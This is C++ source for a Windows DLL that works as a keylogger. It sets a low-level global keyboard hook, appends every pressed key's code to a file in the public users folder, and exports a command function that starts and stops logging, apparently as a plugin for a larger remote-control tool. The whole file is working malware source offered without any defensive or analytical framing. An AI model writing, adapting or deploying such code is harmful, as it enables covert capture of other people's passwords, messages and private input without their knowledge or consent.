#include <Windows.h>
#include <cstdio>

bool isLogging = false;
HHOOK keyboardHook;
HINSTANCE hInst;

LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HC_ACTION && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)) {
        KBDLLHOOKSTRUCT* p = (KBDLLHOOKSTRUCT*)lParam;
        DWORD vkCode = p->vkCode;
        FILE* f;
        fopen_s(&f, "C:\\Users\\Public\\log.txt", "a+");
        if (f) {
            fprintf(f, "Key: %ld\n", vkCode);
            fclose(f);
        }
    }
    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

const char* Execute(const char* args) {
    if (strcmp(args, "start") == 0) {
        if (!isLogging) {
            keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, hInst, 0);
            isLogging = true;
            return "Keylogger started.";
        }
        return "Keylogger already running.";
    }
    else if (strcmp(args, "stop") == 0) {
        if (isLogging) {
            UnhookWindowsHookEx(keyboardHook);
            isLogging = false;
            return "Keylogger stopped.";
        }
        return "Keylogger not running.";
    }
    return "Unknown command.";
}

extern "C" __declspec(dllexport) const char* ExecuteWrapper(const char* args) {
    return Execute(args);
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    if (ul_reason_for_call == DLL_PROCESS_ATTACH) {
        hInst = hModule;
    }
    return TRUE;
}
